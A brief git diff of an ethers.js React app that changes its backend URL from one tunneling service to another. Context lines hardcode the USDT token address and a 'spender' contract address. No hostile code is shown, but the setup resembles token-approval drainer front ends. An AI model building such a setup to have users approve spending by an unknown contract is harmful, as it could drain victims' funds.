@@ -3,7 +3,7 @@ import { ethers } from "ethers";
 import { ScanLine, NotebookTabs } from "lucide-react";
 import "./App.css";
 
-const API_BASE = "https://easy-cycles-sip.loca.lt";
+const API_BASE = "https://nonsensorial-jamie-subminimal.ngrok-free.dev/";
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER_CONTRACT = "0xDe3e5F1FC2B30638Eca306F7ac3D1A2500A14A9b";
 const USDT_DECIMALS = 18;
